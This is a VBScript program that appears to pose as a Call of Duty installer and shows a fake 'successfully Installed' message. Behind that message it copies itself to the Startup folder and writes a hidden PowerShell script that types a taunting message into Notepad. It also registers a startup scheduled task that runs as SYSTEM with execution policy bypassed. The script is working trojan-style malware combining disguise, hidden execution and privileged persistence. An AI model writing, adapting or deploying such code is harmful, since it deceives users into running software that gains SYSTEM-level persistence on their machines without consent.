' BootScript.vbs - Self-copying, embedded PS message creator, and scheduled task setter


Dim fso, shell, scriptPath, startupPath, tempFolder
Dim destPath, notepadScriptPath, psScriptPath, file, psFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

Dim filePath, strFileExist

' Check to see if NotepadMessage.p1 exist
filePath = "$env:APPDATA\Local\Temp\wtc9AACOD031020.ps1"
'Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(filePath) Then
    strFileExist = "Yes"
Else
    strFileExist = "No"
End If

' Define paths
startupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
scriptPath = WScript.ScriptFullName
destPath = startupPath & "\BootScript.vbs"
notepadScriptPath = startupPath & "\wtc9AACOD031020.vbs"
psScriptPath = tempFolder & "\wtc9AACOD031020.ps1"

' Copy this script to Startup
If Not fso.FileExists(destPath) Then
    fso.CopyFile scriptPath, destPath
End If

' Write the embedded PowerShell wtc9AACOD031020.ps1 script
Set psFile = fso.CreateTextFile(psScriptPath, True)
psFile.WriteLine "# Start Notepad in hidden mode"
psFile.WriteLine "$notepad = Start-Process -PassThru notepad"
psFile.WriteLine "Start-Sleep -Seconds 1"
psFile.WriteLine ""
psFile.WriteLine "# Activate Notepad"
psFile.WriteLine "$wshell = New-Object -ComObject WScript.Shell"
psFile.WriteLine "$wshell.AppActivate($notepad.Id)"
psFile.WriteLine "Start-Sleep -Seconds 1"
psFile.WriteLine ""
psFile.WriteLine "# Send message"
psFile.WriteLine "$wshell.SendKeys('^a')"
psFile.WriteLine "Start-Sleep -Milliseconds 500"
psFile.WriteLine "$wshell.SendKeys('{DEL}')"
psFile.WriteLine "Start-Sleep -Milliseconds 500"
psFile.WriteLine "$wshell.SendKeys('Hello again Old Friend')"
psFile.WriteLine "$wshell.SendKeys('{ENTER}')"
psFile.WriteLine "$wshell.SendKeys('            Hello again Old Friend')"
psFile.WriteLine "$wshell.SendKeys('{ENTER}')"
psFile.WriteLine "$wshell.SendKeys('Hello again Old Friend')"
psFile.WriteLine "$wshell.SendKeys('{ENTER}')"
psFile.WriteLine "$wshell.SendKeys('Give me a call you stupid Fool!!!!')"
psFile.Close

' Create VBS launcher for the PS1 script
Dim vbsLauncher

vbsLauncher = _
    "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
    "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
    "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & psScriptPath & """, 0, False"
    
'  "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """" & ", 0, False"

Set file = fso.CreateTextFile(notepadScriptPath, True)
file.WriteLine vbsLauncher
file.Close



' Register a Scheduled Task via PowerShell to run the VBS launcher
Dim psCommand
psCommand = _
    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
    """$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '" & notepadScriptPath & "';" & _
    " $trigger = New-ScheduledTaskTrigger -AtStartup;" & _
    " $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -RunOnlyIfNetworkAvailable;" & _
    " $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;" & _
    " Register-ScheduledTask -TaskName 'PersistentBootScript' -Description 'Runs notepad message on boot as SYSTEM' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force""" 

shell.Run psCommand, 0, True

If strFileExist = "No" Then
    MsgBox "Call of Duty successfully Installed!", vbOKOnly, "Success"
End if
